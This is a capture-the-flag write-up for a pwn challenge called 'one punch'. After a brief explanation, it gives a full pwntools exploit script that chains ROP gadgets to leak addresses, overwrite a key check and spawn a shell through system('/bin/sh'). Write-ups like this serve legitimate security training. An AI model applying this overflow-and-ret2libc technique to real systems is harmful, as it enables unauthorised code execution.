# one punch

Basic ROP challenge but there's a key check preventing restarting the program correctly. We can either overwrite the key or use a one gadget, personally I don't like one gadget because it can be unreliable and feels lame so I went with overwriting the key.

```python
from pwn import *
context.arch = "amd64"

io = process("./one_punch")
# io = remote("netcat.deadsec.quest", 31794)
elf = ELF("./one_punch")
libc = ELF("./libc.so.6")
if args.GDB:
	gdb.attach(io)

io.recvuntil(b"cape! ")
leak = int(io.recvline()[:-1], 16)
log.info(f"program address at: {hex(leak)}")
base = leak - 0x1291
log.info(f"program base is at: {hex(base)}")
elf.address = base

key = base + 0x4050
rop = ROP(elf)
payload = b"A"*120
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(rop.find_gadget(['ret'])[0])

payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(key)
payload += p64(elf.sym['gets'])
payload += p64(elf.symbols.main)
io.sendline(payload)

io.recvline()
leak = unpack(io.recvline()[:-1], "all")
log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

io.sendline(p64(0))

payload = b"A"*120
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
io.sendlineafter(b"hero?", payload)

io.interactive()
```